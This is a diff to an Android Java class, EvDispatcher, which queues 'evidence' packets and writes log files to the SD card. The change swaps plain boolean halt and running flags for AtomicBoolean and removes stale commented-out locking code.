@@ -12,6 +12,7 @@ package com.android.dvci.evidence;
 import java.io.File;
 import java.util.HashMap;
 import java.util.concurrent.LinkedBlockingQueue;
+import java.util.concurrent.atomic.AtomicBoolean;
 
 import com.android.dvci.Packet;
 import com.android.dvci.auto.Cfg;
@@ -35,33 +36,18 @@ public class EvDispatcher extends Thread implements Runnable {
 	private final HashMap<Long, Evidence> evidences;
 
 	/** The halt. */
-	private boolean halt;
+	private AtomicBoolean halt = new AtomicBoolean();
 
 	/** The sd dir. */
 	private File sdDir;
 
-	private boolean running;
-
-	/** The lock. */
-	// final Lock lock = new ReentrantLock();
-
-	/** The no logs. */
-	// final Condition noLogs = lock.newCondition();
-
-	//private Object emptyQueue = new Object();
-
-	/*
-	 * private BroadcastReceiver mExternalStorageReceiver; private boolean
-	 * mExternalStorageAvailable = false; private boolean
-	 * mExternalStorageWriteable = false;
-	 */
+	private AtomicBoolean running = new AtomicBoolean();
 
 	/**
 	 * Instantiates a new log dispatcher.
 	 */
 	private EvDispatcher() {
-		halt = false;
-
+		halt.set(false);
 		queue = new LinkedBlockingQueue<Packet>(Cfg.EV_QUEUE_LEN);
 		evidences = new HashMap<Long, Evidence>();
 
@@ -128,7 +114,7 @@ public class EvDispatcher extends Thread implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (processQueue), INTERRUPT");
 			}
-			halt=true;
+			halt.set(true);
 			break;
 
 		default:
@@ -168,8 +154,9 @@ public class EvDispatcher extends Thread implements Runnable {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " LogDispatcher started"); //$NON-NLS-1$
 		}
-		running = true;
 
+		running.set(true);	
+			
 		// Create log directory
 		sdDir = new File(Path.logs());
 		sdDir.mkdirs();
@@ -177,14 +164,14 @@ public class EvDispatcher extends Thread implements Runnable {
 		// Debug - used to remove the directory
 		// sdDir();
 
-		while (!halt) {
+		while (!halt.get()) {
 			processQueue();
 		}
 
 		queue.clear();
 		evidences.clear();
 
-		running = false;
+		running.set(false);
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " LogDispatcher closing"); //$NON-NLS-1$
 		}
@@ -222,13 +209,13 @@ public class EvDispatcher extends Thread implements Runnable {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (halt)");
 		}
-		halt = true;
+		halt.set(true);
 		queue.add(new Packet());
 
 	}
 	
 	public boolean isRunning(){
-		return running;
+			return running.get();
 	}
 
 	/**
